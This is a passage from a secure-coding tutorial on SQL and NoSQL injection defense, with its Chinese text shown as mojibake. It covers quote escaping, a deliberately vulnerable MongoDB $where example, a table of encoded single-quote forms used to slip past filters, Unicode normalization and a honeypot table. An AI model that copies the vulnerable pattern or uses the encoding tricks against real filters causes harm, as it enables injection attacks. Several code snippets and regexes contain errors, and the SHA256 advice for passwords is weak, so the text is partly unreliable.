class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬äºŒç§åŠæ³•æ˜¯ä½¿ç”¨ä¸€ä¸ªåæ–œçº¿å¯¹å•å¼•å·è¿›è¡Œç¼–ç ï¼Œä½†PostgreSQLè¿˜éœ€è¦åœ¨å­—ç¬¦ä¸²å­—é¢é‡ä¹‹å‰æ”¾ç½®ä¸€ä¸ªå¤§å†™çš„Eå­—æ¯</p><pre class="line-numbers language-plsql" data-language="plsql"><code class="language-plsql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> User <span class="token keyword">WHERE</span> LastName<span class="token operator">=</span>E<span class="token string">'O\'Boyle'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨PHPä¸­ï¼Œå¯ä»¥ä½¿ç”¨add_slashes()æˆ–str_replace()æ–¹æ³•å¯¹åæ–œçº¿æ‰§è¡Œç¼–ç ã€‚åœ¨PHPä¸­ï¼Œå¯¹äºPostgreSQLæ•°æ®åº“è€Œè¨€ï¼Œæœ€ä½³çš„å­—ç¬¦ä¸²ç¼–ç æ–¹å¼æ˜¯ä½¿ç”¨pq_escape_string()æ–¹æ³•ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">pg_escape_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯¥å‡½æ•°å°†è°ƒç”¨libpqçš„PQescapeString()æ–¹æ³•ï¼Œå®ƒå°†æŠŠå•åæ–œçº¿æ›¿æ¢ä¸ºåŒåæ–œçº¿ï¼Œå¹¶ä¸”ç”¨ä¸¤ä¸ªå•å¼•å·æ›¿æ¢ä¸€ä¸ªå•å¼•å·</p><p>åœ¨PostgreSQLä¸­è¿˜å¯ä»¥é‡‡ç”¨å…¶ä»–åŠæ³•åˆ›å»ºå­—ç¬¦ä¸²å­—é¢é‡ï¼Œå³ä½¿ç”¨$å­—ç¬¦ã€‚$å­—ç¬¦å…è®¸å¼€å‘äººå‘˜åœ¨SQLè¯­å¥ä¸­ä½¿ç”¨ç±»ä¼¼äºæ ‡è®°(tag-like)çš„åŠŸèƒ½ã€‚ä¸‹é¢å°±æ˜¯ä¸€ä¸ªä½¿ç”¨è¿™ç§è¯­æ³•åˆ›å»ºçš„å­—ç¬¦ä¸²ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">User</span> <span class="token keyword">WHERE</span> LastName<span class="token operator">=</span>$quote$O'Boyle$quote$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹äºç”¨æˆ·è¾“å…¥çš„ä»»ä½•ä¸€ä¸ª$å­—ç¬¦ï¼Œéƒ½éœ€è¦ç¡®ä¿ä½¿ç”¨ä¸€ä¸ªåæ–œçº¿è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼š </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$encodedValue</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\$"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="é˜²æ­¢NoSQLæ³¨å…¥"><a href="#é˜²æ­¢NoSQLæ³¨å…¥" class="headerlink" title="é˜²æ­¢NoSQLæ³¨å…¥"></a>é˜²æ­¢NoSQLæ³¨å…¥</h5><p>åœ¨NoSQLçš„æŸ¥è¯¢APIä¸­ï¼Œç»å¤§å¤šæ•°æ–¹æ³•éƒ½æä¾›äº†å°†æ•°æ®ä¸ä»£ç æ¸…æ™°åˆ†ç¦»çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œå½“ä»PHPä¸­ä½¿ç”¨MongoDBæ—¶ï¼Œå…¸å‹çš„æ–¹æ³•æ˜¯ä½¿ç”¨å…³è”æ•°ç»„(associative array)æ’å…¥æ•°æ®ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$users</span><span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span><span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span> <span class="token operator">=&gt;</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥è¯¢åˆ™å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$users</span><span class="token operator">-&gt;</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=&gt;</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“ä½¿ç”¨è¿™äº›APIæ—¶ï¼Œç”±äºé¿å…äº†ä½¿ç”¨å­—ç¬¦ä¸²è¿æ¥æ¥æ„é€ æŸ¥è¯¢ï¼Œå› æ­¤é˜²æ­¢äº†æ³¨å…¥æ”»å‡»ã€‚</p><p>å¯¹äºæ›´é«˜çº§çš„æŸ¥è¯¢ï¼ŒMongoDBå…è®¸å¼€å‘äººå‘˜ä½¿ç”¨$whereå…³é”®å­—æäº¤ä¸€ä¸ªJavaScriptå‡½æ•°ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$collection</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\$where"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"function(){ return this.username.indexOf('<span class="token interpolation"><span class="token variable">$test</span></span>') &gt; -1 }"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¯¥JavaScriptå‡½æ•°å¾ˆå®¹æ˜“é­åˆ°æ³¨å…¥æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥è½¬ä¹‰indexOf()å†…çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ”¹å˜æŸ¥è¯¢æ‰§è¡Œçš„æ–¹å¼ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œæˆ‘ä»¬å¿…é¡»å¯¹JavaScriptè¿›è¡Œç¼–ç ã€‚ä½¿ç”¨åå…­è¿›åˆ¶çš„\xnnç¼–ç ç±»å‹ï¼Œæˆ–ä½¿ç”¨\unnnnç±»å‹çš„Unicodeç¼–ç ï¼Œå¯¹æ‰€æœ‰éå­—æ¯æˆ–æ•°å­—çš„å­—ç¬¦å…¨éƒ¨è¿›è¡Œè½¬ ä¹‰ï¼Œè¿™æ˜¯æœ€å®‰å…¨çš„åŠæ³•ã€‚</p><h3 id="è§„èŒƒåŒ–"><a href="#è§„èŒƒåŒ–" class="headerlink" title="è§„èŒƒåŒ–"></a>è§„èŒƒåŒ–</h3><p>é¿å¼€è¾“å…¥éªŒè¯å’Œè¾“å‡ºç¼–ç çš„å¸¸ç”¨æŠ€æœ¯æ˜¯ï¼šåœ¨å°†è¾“å…¥å‘é€ç»™åº”ç”¨ç¨‹åºä¹‹å‰å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œä¹‹åå†å¯¹å…¶è¿›è¡Œè§£ç å’Œè§£é‡Šä»¥ç¬¦åˆæ”»å‡»è€…çš„ç›®æ ‡ã€‚</p><p>å•å¼•å·çš„ä¾‹å­</p><table><thead><tr><th align="center">è¡¨ç¤º</th><th align="center">ç¼–ç ç±»å‹</th></tr></thead><tbody><tr><td align="center">%27</td><td align="center">URLç¼–ç </td></tr><tr><td align="center">%2527</td><td align="center">åŒURLç¼–ç </td></tr><tr><td align="center">%%317</td><td align="center">åµŒå¥—çš„åŒURLç¼–ç </td></tr><tr><td align="center">%u0027</td><td align="center">Unicode è¡¨ç¤º</td></tr><tr><td align="center">%u02b9</td><td align="center">Unicode è¡¨ç¤º</td></tr><tr><td align="center">%ca%b9</td><td align="center">Unicode è¡¨ç¤º</td></tr><tr><td align="center">&amp;apos</td><td align="center">HTMLå®ä½“</td></tr><tr><td align="center">&amp;#39</td><td align="center">åè¿›åˆ¶HTMLå®ä½“</td></tr><tr><td align="center">&amp;#x27</td><td align="center">åå…­è¿›åˆ¶HTMLå®ä½“</td></tr><tr><td align="center">%26apos</td><td align="center">æ··åˆçš„URL/HTMLç¼–ç </td></tr></tbody></table><p>è§„èŒƒåŒ–æ˜¯æŒ‡å°†è¾“å…¥ç®€åŒ–æˆæ ‡å‡†æˆ–ç®€å•çš„å½¢å¼ï¼Œä¾‹å¦‚å˜æˆå•å¼•å·</p><h4 id="è§„æ ¼åŒ–æ–¹æ³•"><a href="#è§„æ ¼åŒ–æ–¹æ³•" class="headerlink" title="è§„æ ¼åŒ–æ–¹æ³•"></a>è§„æ ¼åŒ–æ–¹æ³•</h4><ul><li>æ‹’ç»æ‰€æœ‰ä¸ç¬¦åˆæ ¼å¼çš„è¾“å…¥ï¼Œä¾‹å¦‚åˆ©ç”¨ç™½åå•æ‹’ç»æ‰€æœ‰ç¼–ç è¾“å…¥</li><li>å¯¹è¾“å…¥å¤šæ¬¡è§£ç ï¼Œæˆ–è€…è§£ç ä¸€æ¬¡ï¼Œè‹¥è¿˜éœ€è§£ç å°±æŠ›å¼ƒ</li></ul><h5 id="é€‚ç”¨äºUnicodeçš„æ–¹æ³•"><a href="#é€‚ç”¨äºUnicodeçš„æ–¹æ³•" class="headerlink" title="é€‚ç”¨äºUnicodeçš„æ–¹æ³•"></a>é€‚ç”¨äºUnicodeçš„æ–¹æ³•</h5><p>é‡åˆ°åƒUTF-8è¿™æ ·çš„Unicodeè¾“å…¥æ—¶ï¼Œä¸€ç§æ–¹æ³•æ˜¯å°†è¾“å…¥æ ‡å‡†åŒ–ï¼ˆnormalizationï¼‰ã€‚è¯¥æ–¹æ³•ä½¿ç”¨å®šä¹‰å¥½çš„è§„åˆ™é›†å°†Unicodeè½¬æ¢æˆæœ€ç®€å•çš„å½¢å¼ã€‚å°†åŒå€å®½åº¦åŠå…¶ä»–çš„Unicodeç¼–ç åœ¨å®ƒä»¬æ‰€å¤„çš„ä½ç½®è½¬æ¢æˆå„è‡ªçš„ASCII ç­‰ä»·å½¢å¼ã€‚</p><p>ä½¿ç”¨Javaä¸­çš„Normalizerç±»ï¼ˆJava 6åŠä»¥ä¸Šç‰ˆæœ¬ï¼‰æ¥å°†è¾“å…¥æ ‡å‡†åŒ–</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">normalized <span class="token operator">=</span> <span class="token class-name">Normalizer</span><span class="token punctuation">.</span><span class="token function">normalize</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span><span class="token class-name">Normalizer<span class="token punctuation">.</span>Form</span><span class="token punctuation">.</span><span class="token constant">NFKC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨C#ä¸­Stringç±»çš„Normalizeæ–¹æ³•æ¥å°†è¾“å…¥æ ‡å‡†åŒ–</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">normalized = input.Normalize(NormalizationForm.FormKC);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨PHPä¸­PEARåº“çš„PEAR::I18N_UnicodeNormalizeråŒ…æ¥å°†è¾“å…¥æ ‡å‡†åŒ–</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$normalized</span> <span class="token operator">=</span> <span class="token class-name static-context">I18N_UnicodeNormalizer</span><span class="token operator">::</span><span class="token function">toNFKC</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯é¦–å…ˆæ£€æŸ¥Unicodeæ˜¯æœ‰æ•ˆçš„ï¼Œç„¶åå°†æ•°æ®è½¬æ¢æˆä¸€ç§å¯é¢„è§çš„æ ¼å¼ï¼Œä¾‹å¦‚åƒISO-8859-1è¿™æ ·çš„è¥¿æ¬§å­—ç¬¦é›†ã€‚</p><p>ç”¨äºè§£æUTF-8çš„æ­£åˆ™è¡¨è¾¾å¼</p><table><thead><tr><th align="center">æ­£åˆ™è¡¨è¾¾å¼</th><th align="center">æ   è¿°</th></tr></thead><tbody><tr><td align="center">[x00-\x7F]</td><td align="center">ASCII</td></tr><tr><td align="center">[\xC2-\xDF][\x80-\xBF]</td><td align="center">åŒå­—èŠ‚è¡¨ç¤º</td></tr><tr><td align="center">\xE0[\xA0-\xBF][\x80-\xBF]</td><td align="center">åŒå­—èŠ‚è¡¨ç¤º</td></tr><tr><td align="center">[\xEl-\xEC\xEE\xEF][\x80-\xBF] {2}</td><td align="center">ä¸‰å­—èŠ‚è¡¨ç¤º</td></tr><tr><td align="center">\xED [\x80-\x9F][\x80-\xBF]</td><td align="center">ä¸‰å­—èŠ‚è¡¨ç¤º</td></tr><tr><td align="center">\xFO [\x90-\xBF][\x80-\xBF] {2}</td><td align="center">plane 1 è‡³ij 3</td></tr><tr><td align="center">[\xF 1 -\xF3][\x80-\xBF] {3}</td><td align="center">panel 4 åˆ° 15</td></tr><tr><td align="center">\xF4 [\x80-\x8F][\x80-\xBF] {2}</td><td align="center">panel 16</td></tr></tbody></table><p>æ£€æŸ¥å®Œè¾“å…¥æ˜¯æœ‰æ•ˆçš„æ ¼å¼åï¼Œç°åœ¨å¯ä»¥å°†å®ƒè½¬æ¢æˆå¯é¢„è§çš„æ ¼å¼ã€‚</p><p>åœ¨Javaä¸­ï¼Œå¯ä»¥ä½¿ç”¨CharsetEncoderç±»æˆ–æ¯”è¾ƒç®€å•çš„getBytes()æ–¹æ³•ï¼ˆJava 6åŠä¹‹åçš„ç‰ˆæœ¬ï¼‰</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">string ascii <span class="token operator">=</span> utf8<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"ISO-8859-1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨C#ä¸­ï¼Œå¯ä»¥ä½¿ç”¨Encoding.Converterç±»</p><pre class="line-numbers language-C#" data-language="C#"><code class="language-C#">byte[] asciiBytes = Encoding.Convert(Encoding.UTF8,Encoding.ASCII,utf8Bytes);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨PHPä¸­ï¼Œå¯ä»¥ä½¿ç”¨utf8_decode</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">ascii <span class="token operator">=</span> <span class="token function">utf8_decode</span><span class="token punctuation">(</span><span class="token variable">$utf8string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="é€šè¿‡è®¾è®¡æ¥é¿å…SQLæ³¨å…¥çš„å±é™©"><a href="#é€šè¿‡è®¾è®¡æ¥é¿å…SQLæ³¨å…¥çš„å±é™©" class="headerlink" title="é€šè¿‡è®¾è®¡æ¥é¿å…SQLæ³¨å…¥çš„å±é™©"></a>é€šè¿‡è®¾è®¡æ¥é¿å…SQLæ³¨å…¥çš„å±é™©</h3><h4 id="ä½¿ç”¨å‚¨å­˜è¿‡ç¨‹"><a href="#ä½¿ç”¨å‚¨å­˜è¿‡ç¨‹" class="headerlink" title="ä½¿ç”¨å‚¨å­˜è¿‡ç¨‹"></a>ä½¿ç”¨å‚¨å­˜è¿‡ç¨‹</h4><p>åœ¨å¤§å¤šæ•°æ•°æ®åº“ä¸­ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹æ—¶éƒ½å¯ä»¥åœ¨æ•°æ®åº“å±‚é…ç½®è®¿é—®æ§åˆ¶ã€‚é€šè¿‡æ­£ç¡®é…ç½®è®¸å¯æƒé™æ¥ä¿è¯æ”»å‡»è€…æ— æ³•è®¿é—®æ•°æ®åº“ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><h4 id="ä½¿ç”¨æŠ½è±¡å±‚"><a href="#ä½¿ç”¨æŠ½è±¡å±‚" class="headerlink" title="ä½¿ç”¨æŠ½è±¡å±‚"></a>ä½¿ç”¨æŠ½è±¡å±‚</h4><p>è¡¨ç¤ºã€ä¸šåŠ¡é€»è¾‘å’Œæ•°æ®è®¿é—®å®šä¹‰ä¸åŒçš„å±‚ï¼Œä»è€Œå°†æ¯ä¸€å±‚çš„å®ç°ä»æ€»ä½“è®¾è®¡ä¸­æŠ½è±¡å‡ºæ¥ã€‚</p><h4 id="å¤„ç†æ•æ„Ÿæ•°æ®"><a href="#å¤„ç†æ•æ„Ÿæ•°æ®" class="headerlink" title="å¤„ç†æ•æ„Ÿæ•°æ®"></a>å¤„ç†æ•æ„Ÿæ•°æ®</h4><p>è€ƒè™‘æ•°æ®åº“ä¸­æ•æ„Ÿä¿¡æ¯çš„å­˜å‚¨å’Œè®¿é—®ã€‚</p><p>å£ä»¤ï¼šå¦‚æœå¯èƒ½çš„è¯ï¼Œä¸åº”è¯¥åœ¨æ•°æ®åº“ä¸­å­˜å‚¨ç”¨æˆ·å£ä»¤ã€‚æ¯”è¾ƒå®‰å…¨çš„åšæ³•æ˜¯å­˜å‚¨æ¯ä¸ªç”¨æˆ·å£ä»¤çš„åŠ ç›ï¼ˆsaltedï¼‰å•å‘å“ˆå¸Œï¼ˆä½¿ç”¨SHA256è¿™æ ·çš„å®‰å…¨å“ˆå¸Œç®—æ³•ï¼‰è€Œä¸æ˜¯å£ä»¤æœ¬èº«ã€‚</p><p>ä¿¡ç”¨å¡åŠå…¶ä»–è´¢åŠ¡ä¿¡æ¯ï¼šåº”è¯¥ä½¿ç”¨è®¤å¯çš„ï¼ˆæ¯”å¦‚FIPSè®¤è¯è¿‡çš„ï¼‰åŠ å¯†ç®—æ³•æ¥å¯¹ä¿¡ç”¨å¡ç­‰ä¿¡æ¯è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå­˜å‚¨åŠ å¯†åçš„æ˜ç»†æ•°æ®ã€‚</p><p>å­˜æ¡£ï¼šå¦‚æœæœªè¦æ±‚åº”ç”¨ç¨‹åºä¿å­˜æäº¤ç»™å®ƒçš„æ‰€æœ‰æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ä¸ªäººå¯è¯†åˆ«çš„ä¿¡æ¯ï¼‰çš„å®Œæ•´å†å²è®°å½•ï¼Œå°±åº”è€ƒè™‘æ¯éš”ä¸€æ®µåˆç†çš„æ—¶é—´å°±å­˜æ¡£æˆ–æ¸…é™¤è¿™äº›ä¸éœ€è¦çš„ä¿¡æ¯ã€‚</p><h4 id="é¿å…æ˜æ˜¾çš„å¯¹è±¡å"><a href="#é¿å…æ˜æ˜¾çš„å¯¹è±¡å" class="headerlink" title="é¿å…æ˜æ˜¾çš„å¯¹è±¡å"></a>é¿å…æ˜æ˜¾çš„å¯¹è±¡å</h4><p>ä¸ºå…³é”®å¯¹è±¡ï¼ˆæ¯”å¦‚åŠ å¯†å‡½æ•°ã€å£ä»¤åˆ—å’Œä¿¡ç”¨å¡åˆ—ï¼‰é€‰å–åç§°æ—¶åº”è¯¥ æ ¼å¤–å°å¿ƒï¼Œä¸è¦é€‰å–æ˜“è¢«æ‹†è§£çš„åå­—ï¼Œå¦‚passwd</p><h4 id="åˆ›å»ºhoneypot-èœœç½"><a href="#åˆ›å»ºhoneypot-èœœç½" class="headerlink" title="åˆ›å»ºhoneypot(èœœç½)"></a>åˆ›å»ºhoneypot(èœœç½)</h4><p>å¦‚æœå¸Œæœ›åœ¨æœ‰äººå°è¯•ä»æ•°æ®åº“è¯»å–å£ä»¤æ—¶æ”¶åˆ°è­¦å‘Šï¼Œå¯ä»¥åˆ›å»ºä¸€ç§å¸¦passwordåˆ—ï¼ˆåŒ…å«å‡æ•°æ®ï¼‰çš„é™„åŠ honeypotï¼ˆèœœç½ï¼‰è¡¨ã€‚å¦‚æœå‡æ•°æ®è¢«é€‰ä¸­ï¼Œé‚£ä¹ˆåº”ç”¨ç®¡ç†å‘˜å°†ä¼šæ”¶åˆ°ä¸€å°e-mailã€‚</p><p>åœ¨ Oracleä¸­ï¼Œå¯ä»¥ä½¿ç”¨è™šæ‹Ÿä¸“ç”¨æ•°æ®åº“ï¼ˆVirtual Private Database, VPDï¼‰æ¥å®ç°</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--åˆ›å»ºèœœç½è¡¨</span><span class="token keyword">create</span> <span class="token keyword">table</span> app_user<span class="token punctuation">.</span>tblusers <span class="token punctuation">(</span><span class="token operator">is</span> number<span class="token punctuation">,</span> name varchar2<span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> password varchar2 <span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--åˆ›å»ºå‘ç®¡ç†å‘˜å‘é€e-mailçš„ç­–ç•¥å‡½æ•°</span><span class="token comment">--å¿…é¡»ç”¨å¦å¤–ä¸€ä¸ªæ¨¡å¼æ¥åˆ›å»ºè¯¥å‡½æ•°ï¼Œæ¯”å¦‚secuser</span><span class="token keyword">create</span> <span class="token operator">or</span> <span class="token keyword">replace</span> secuser<span class="token punctuation">.</span><span class="token keyword">function</span> get_cust_idp_schema <span class="token operator">in</span> varchar2<span class="token punctuation">,</span>p_table <span class="token operator">in</span> varchar2<span class="token punctuation">)</span><span class="token keyword">return</span> varchar2<span class="token keyword">as</span>v_connection UTL_SMTP<span class="token punctuation">.</span>CONNECTION<span class="token punctuation">;</span><span class="token keyword">begin</span>v_connection :<span class="token operator">=</span> UTL_SMTP<span class="token punctuation">.</span>OPEN_CONNECTION<span class="token punctuation">(</span><span class="token string">'mailhost.victim.com'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span>HELO<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'mailhost.victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span>MAIL<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'app@victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span>RCPT<span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'admin@victim.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>UTL_SMTP<span class="token punctuation">.</span><span class="token keyword">DATA</span><span class="token punctuation">(</span>v_connection<span class="token punctuation">,</span><span class="token string">'WARNING! SELECT PERFORMED ON HONEYPOT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> UTL_SMTP<span class="token punctuation">.</span>QUIT<span class="token punctuation">(</span>v_connection<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">'1=1'</span> <span class="token punctuation">;</span><span class="token comment">--æ€»æ˜¯æ˜¾ç¤ºæ•´ä¸ªè¡¨</span><span class="token keyword">end</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token comment">--å°†ç­–ç•¥å‡½æ•°èµ‹å€¼ç»™èœœç½è¡¨TBLUSERS</span><span class="token keyword">exec</span> dbms_rls<span class="token punctuation">.</span>add_policy <span class="token punctuation">(</span><span class="token string">'APP_USER'</span><span class="token punctuation">,</span><span class="token string">'TBLUSERS'</span><span class="token punctuation">,</span><span class="token string">'GET_CUST_ID'</span><span class="token punctuation">,</span><span class="token string">'SECUSER'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'SELECT, INSERT, UPDATE, DELETE'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é™„åŠ çš„å®‰å…¨å¼€å‘èµ„æº"><a href="#é™„åŠ çš„å®‰å…¨å¼€å‘èµ„æº" class="headerlink" title="é™„åŠ çš„å®‰å…¨å¼€å‘èµ„æº"></a>é™„åŠ çš„å®‰å…¨å¼€å‘èµ„æº</h4><ul><li><p>OWASP(Open Web Application Security Projectï¼Œå¼€æ”¾å¼ Web åº”ç”¨å®‰å…¨é¡¹ç›®<a href="http://www.owasp.org/">owasp</a> </p></li><li><p>CWE/SANS 2009 å¹´åº¦25å¤§æœ€å±é™©ç¼–ç¨‹é”™è¯¯(<a href="http://cwe.mitre.org/top25/index.html)%E6%98%AF">http://cwe.mitre.org/top25/index.html)æ˜¯</a> MITRE (SANSåä¼š)å’Œè®¸å¤šé«˜çº§å®‰å…¨ä¸“å®¶é€šåŠ›åˆä½œçš„æˆæœ</p></li><li><p>SANSè½¯ä»¶å®‰å…¨åä¼š(<a href="http://www.sans-ssi.org)æä¾›äº†å®‰å…¨å¼€å‘æ–¹é¢çš„åŸ¹è®­å’Œè¯ä¹¦,ä»¥åŠå¤§é‡ç”±sansè®¤è¯æ£€éªŒå‘˜æä¾›çš„å‚è€ƒä¿¡æ¯å’Œç ”ç©¶èµ„æ–™./">www.sans-ssi.org)æä¾›äº†å®‰å…¨å¼€å‘æ–¹é¢çš„åŸ¹è®­å’Œè¯ä¹¦ï¼Œä»¥åŠå¤§é‡ç”±SANSè®¤è¯æ£€éªŒå‘˜æä¾›çš„å‚è€ƒä¿¡æ¯å’Œç ”ç©¶èµ„æ–™ã€‚</a></p></li><li><p>Oracle çš„ SQL æ³¨å…¥æ”»å‡»é˜²å¾¡æŒ‡å—(<a href="http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%BE%88%E5%A4%9A%E6%9C%89%E5%8A%A9%E4%BA%8E%E5%85%8D%E5%8F%97SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%B7%A5%E5%85%B7%E5%92%8C%E6%8A%80%E6%9C%AF%E3%80%82">http://st-curriculum.oracle.com/tutorial/SQLInjection/index.htm)ä»‹ç»äº†å¾ˆå¤šæœ‰åŠ©äºå…å—SQLæ³¨å…¥æ”»å‡»çš„å·¥å…·å’ŒæŠ€æœ¯ã€‚</a></p></li><li><p>SQLSecurity.com(<a href="http://www.sqlsecurity.com)æ˜¯ä¸€ä¸ªè‡´åŠ›äº/">www.sqlsecurity.com)æ˜¯ä¸€ä¸ªè‡´åŠ›äº</a> Microsoft SQL Server å®‰å…¨çš„ç«™ç‚¹</p></li><li><p>Red-Database-Security(<a href="http://www.red-database-security.comæ˜¯ä¸€ä¸ªä¸“é—¨ç ”ç©¶/">www.red-database-security.comæ˜¯ä¸€ä¸ªä¸“é—¨ç ”ç©¶</a> Oracle å®‰å…¨çš„å…¬å¸ã€‚å®ƒçš„ç½‘ç«™ä¸ŠåŒ…å«äº†å¾ˆå¤šå¯ä¾›ä¸‹è½½çš„å…³äºOracleå®‰å…¨çš„æŠ¥å‘Šå’Œç™½çš®ä¹¦ã€‚</p></li><li><p>Pete Finnegan Limited(<a href="http://petefinnigan.com)ä¹Ÿæä¾›äº†å¤§é‡ç”¨äºä¿è¯/">http://petefinnigan.com)ä¹Ÿæä¾›äº†å¤§é‡ç”¨äºä¿è¯</a> Oracle æ•°æ®åº“å®‰å…¨çš„ä¿¡æ¯ã€‚</p></li></ul><h2 id="å¹³å°å±‚é˜²å¾¡"><a href="#å¹³å°å±‚é˜²å¾¡" class="headerlink" title="å¹³å°å±‚é˜²å¾¡"></a>å¹³å°å±‚é˜²å¾¡</h2><h3 id="ä½¿ç”¨è¿è¡Œæ—¶ä¿æŠ¤"><a href="#ä½¿ç”¨è¿è¡Œæ—¶ä¿æŠ¤" class="headerlink" title="ä½¿ç”¨è¿è¡Œæ—¶ä¿æŠ¤"></a>ä½¿ç”¨è¿è¡Œæ—¶ä¿æŠ¤</h3><h4 id="Webåº”ç”¨é˜²ç«å¢™"><a href="#Webåº”ç”¨é˜²ç«å¢™" class="headerlink" title="Webåº”ç”¨é˜²ç«å¢™"></a>Webåº”ç”¨é˜²ç«å¢™</h4><p>Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰æ˜¯ä¸€ç§ç½‘ç»œè®¾å¤‡æˆ–æ˜¯ä¸€ç§å°†å®‰å…¨ç‰¹æ€§æ·»åŠ 